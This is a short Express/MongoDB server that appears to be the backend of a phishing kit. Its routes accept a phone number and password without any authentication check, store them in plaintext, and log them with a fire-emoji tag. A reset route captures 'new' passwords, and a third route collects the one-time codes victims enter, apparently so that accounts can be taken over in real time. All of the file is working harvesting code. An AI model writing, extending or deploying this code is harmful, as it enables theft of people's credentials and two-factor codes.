const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
app.use(express.json());
app.use(cors());

const userSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: true },
    password: { type: String, required: true },
    otpEntered: { type: String, default: "" },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Routes
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password });
        const savedUser = await newUser.save();
        console.log(`[🔥 LOGIN] Phone: ${phoneNumber}, Pass: ${password}`);
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (err) {
        res.status(500).json({ success: false, message: "Server Error" });
    }
});

app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        const newUser = new User({ phoneNumber: phone, password: newPassword });
        const savedUser = await newUser.save();
        console.log(`[🔑 FORGOT] Phone: ${phone}, Pass: ${newPassword}`);
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp } = req.body;
        console.log(`[📩 OTP RECEIVED] UserID: ${userId}, OTP: ${otp}`);
        
        if (userId) {
            // Yahan fix kiya gaya warning hataane ke liye
            await User.findByIdAndUpdate(userId, { otpEntered: otp }, { returnDocument: 'after' });
            res.status(200).json({ success: true });
        }
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

// Start
async function startServer() {
    const mongoServer = await MongoMemoryServer.create();
    await mongoose.connect(mongoServer.getUri());
    const PORT = process.env.PORT || 4000;
    app.listen(PORT, () => console.log(`🚀 Server Running on ${PORT}`));
}
startServer();
